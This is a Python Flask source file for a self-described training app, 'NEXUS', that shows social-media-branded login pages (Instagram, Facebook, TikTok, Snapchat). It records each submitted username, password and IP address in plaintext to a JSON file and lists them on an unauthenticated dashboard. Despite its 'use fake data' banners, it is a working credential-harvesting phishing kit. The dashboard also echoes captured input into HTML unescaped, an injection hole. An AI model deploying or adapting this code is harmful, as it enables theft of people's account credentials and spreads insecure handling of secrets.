#!/usr/bin/env python3
from flask import Flask, request
import json
import os
import datetime

app = Flask(__name__)
LOG_FILE = "captures.json"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

# Platform data with REAL colors
PLATFORMS = {
    'instagram': {
        'name': 'Instagram',
        'color': '#E4405F',
        'bg': '#fafafa',
        'icon': '📸'
    },
    'facebook': {
        'name': 'Facebook',
        'color': '#1877F2',
        'bg': '#f0f2f5',
        'icon': '👍'
    },
    'tiktok': {
        'name': 'TikTok',
        'color': '#000000',
        'bg': '#ffffff',
        'icon': '🎵'
    },
    'snapchat': {
        'name': 'Snapchat',
        'color': '#FFFC00',
        'bg': '#f5f5f5',
        'icon': '👻'
    }
}

# ---------- HOMEPAGE (Cards with REAL HTML) ----------
HTML_HOME = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .icon { font-size: 60px; margin-bottom: 10px; }
        h1 { font-size: 36px; font-weight: 700; color: #111; margin-bottom: 6px; }
        .sub { font-size: 16px; color: #666; margin-bottom: 30px; }
        .warning {
            font-size: 14px;
            color: #e74c3c;
            font-weight: 500;
            margin-bottom: 20px;
            background: #fef0ef;
            padding: 10px 14px;
            border-radius: 10px;
            display: inline-block;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }
        .card {
            background: #f5f5f5;
            padding: 24px 16px;
            border-radius: 16px;
            border: 1px solid #eee;
            text-decoration: none;
            color: #111;
            display: block;
            transition: 0.2s;
            position: relative;
        }
        .card:active { transform: scale(0.95); }
        .card .emoji { font-size: 44px; display: block; margin-bottom: 8px; }
        .card .name { font-weight: 600; font-size: 15px; }
        .card .badge {
            position: absolute;
            top: 8px;
            right: 10px;
            font-size: 11px;
            background: rgba(0,0,0,0.05);
            padding: 2px 10px;
            border-radius: 12px;
            color: #888;
        }

        /* Platform colors */
        .card.instagram { background: #fafafa; border-color: #E4405F; }
        .card.instagram .name { color: #E4405F; }
        .card.instagram::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 4px;
            background: linear-gradient(90deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            border-radius: 16px 16px 0 0;
        }

        .card.facebook { background: #f0f2f5; border-color: #1877F2; }
        .card.facebook .name { color: #1877F2; }
        .card.facebook::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 4px;
            background: #1877F2;
            border-radius: 16px 16px 0 0;
        }

        .card.tiktok { background: #ffffff; border-color: #000000; }
        .card.tiktok .name { color: #000000; }
        .card.tiktok::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 4px;
            background: linear-gradient(90deg, #000000, #25f4ee, #fe2c55);
            border-radius: 16px 16px 0 0;
        }

        .card.snapchat { background: #f5f5f5; border-color: #FFFC00; }
        .card.snapchat .name { color: #000000; }
        .card.snapchat::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 4px;
            background: #FFFC00;
            border-radius: 16px 16px 0 0;
        }

        .footer { margin-top: 30px; font-size: 14px; color: #999; }
        .footer span { color: #111; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="sub">Learn cybersecurity by doing</p>
        <div class="warning">⚠️ Training mode — use fake data</div>
        <div class="grid">
            <a href="/login/instagram" class="card instagram">
                <span class="emoji">📸</span>
                <span class="name">Instagram</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/facebook" class="card facebook">
                <span class="emoji">👍</span>
                <span class="name">Facebook</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/tiktok" class="card tiktok">
                <span class="emoji">🎵</span>
                <span class="name">TikTok</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/snapchat" class="card snapchat">
                <span class="emoji">👻</span>
                <span class="name">Snapchat</span>
                <span class="badge">🔒</span>
            </a>
        </div>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
</body>
</html>
"""

# ---------- LOGIN PAGE (Facebook style + NEXUS brand + password toggle) ----------
def get_login_page(platform):
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: #ffffff;
            border-radius: 12px;
            padding: 30px 24px 40px 24px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
            text-align: center;
        }
        .brand {
            font-size: 36px;
            font-weight: 700;
            color: #1877F2;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }
        .brand-icon { font-size: 32px; margin-right: 4px; }
        .sub-brand {
            font-size: 16px;
            color: #606770;
            margin-bottom: 24px;
            font-weight: 400;
        }
        .input-group {
            position: relative;
            margin: 10px 0;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            padding-right: 48px;
            background: #f5f6f7;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 17px;
            color: #1b1f23;
            transition: 0.2s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #1877F2;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
        }
        .input-group input::placeholder { color: #8a8d91; }
        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 22px;
            cursor: pointer;
            padding: 0;
            color: #8a8d91;
            opacity: 0.6;
            line-height: 1;
        }
        .toggle-password:hover { opacity: 1; }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1877F2;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: 0.2s;
        }
        .login-btn:hover { background: #166fe5; }
        .divider {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 24px 0 16px 0;
        }
        .signup-link {
            display: block;
            color: #1877F2;
            text-decoration: none;
            font-size: 17px;
            font-weight: 500;
            transition: 0.2s;
            padding: 8px 0;
        }
        .signup-link:hover { text-decoration: underline; }
        .signup-sub {
            font-size: 14px;
            color: #606770;
            margin-top: 4px;
            font-weight: 400;
        }
        .signup-sub span { color: #1b1f23; font-weight: 500; }
        .footer {
            margin-top: 28px;
            font-size: 13px;
            color: #8a8d91;
            border-top: 1px solid #e4e6eb;
            padding-top: 18px;
        }
        .footer span { color: #1b1f23; font-weight: 500; }
        .warning-text {
            font-size: 14px;
            color: #e74c3c;
            font-weight: 500;
            background: #fef0ef;
            padding: 8px 14px;
            border-radius: 8px;
            display: inline-block;
            margin-bottom: 20px;
        }
        .back-link {
            display: inline-block;
            margin-top: 12px;
            color: #1877F2;
            text-decoration: none;
            font-size: 15px;
            font-weight: 400;
        }
        .back-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand">
            <span class="brand-icon">🧸</span> NEXUS
        </div>
        <div class="sub-brand">Knowledge over chaos</div>

        <div class="warning-text">⚠️ Training mode — use fake data</div>

        <form action="/login/facebook" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Mobile number or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>

        <hr class="divider">

        <a href="#" class="signup-link">Luiz Vad 🧸</a>
        <div class="signup-sub">Knowledge over chaos</div>

        <a href="/" class="back-link">← Go back</a>

        <div class="footer">
            Built by <span>Luiz Vad</span> 🧸
        </div>
    </div>

    <script>
        function togglePassword() {
            const input = document.getElementById('password');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = '🙈';
            } else {
                input.type = 'password';
                btn.textContent = '👁️';
            }
        }
    </script>
</body>
</html>
"""

# ---------- ROUTES ----------
@app.route('/')
def home():
    return HTML_HOME

@app.route('/login/<platform>')
def login_page(platform):
    if platform not in PLATFORMS:
        return "Platform not found", 404
    return get_login_page(platform)

@app.route('/login/<platform>', methods=['POST'])
def login_post(platform):
    if platform not in PLATFORMS:
        return "Platform not found", 404

    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr

    with open(LOG_FILE, "r") as f:
        logs = json.load(f)

    logs.append({
        "timestamp": str(datetime.datetime.now()),
        "platform": PLATFORMS[platform]['name'],
        "username": username,
        "password": password,
        "ip": ip
    })

    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=4)

    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container { max-width: 400px; width: 100%; text-align: center; }
        h1 { font-size: 40px; color: #111; margin-bottom: 6px; }
        .icon { font-size: 60px; }
        .msg { font-size: 18px; color: #333; margin: 20px 0; }
        .sub { font-size: 16px; color: #666; }
        a {
            display: inline-block;
            margin-top: 25px;
            color: #007aff;
            text-decoration: none;
            font-size: 18px;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="msg">⚠️ This is a training honeypot.</p>
        <p class="sub">Your data has been recorded.</p>
        <a href="/">← Go back</a>
    </div>
</body>
</html>
    """

@app.route('/dashboard')
def dashboard():
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)

    html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            max-width: 700px;
            margin: 0 auto;
        }
        h1 { font-size: 32px; color: #111; margin-bottom: 8px; }
        .back { color: #007aff; text-decoration: none; font-size: 16px; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 14px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 10px 8px;
            text-align: left;
        }
        th { background: #f5f5f5; color: #111; font-weight: 600; }
        tr:nth-child(even) { background: #fafafa; }
        .total { color: #666; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <h1>📊 NEXUS Dashboard</h1>
    <p><a href="/" class="back">← Go back</a></p>
    <table>
        <tr><th>Time</th><th>Platform</th><th>Name</th><th>Password</th><th>IP</th></tr>
    """

    for log in logs[-20:]:
        html += f"<tr><td>{log['timestamp']}</td><td>{log.get('platform', 'N/A')}</td><td>{log['username']}</td><td>{log['password']}</td><td>{log['ip']}</td></tr>"

    html += f"""
    </table>
    <p class="total">Total attempts: {len(logs)}</p>
</body>
</html>
    """
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
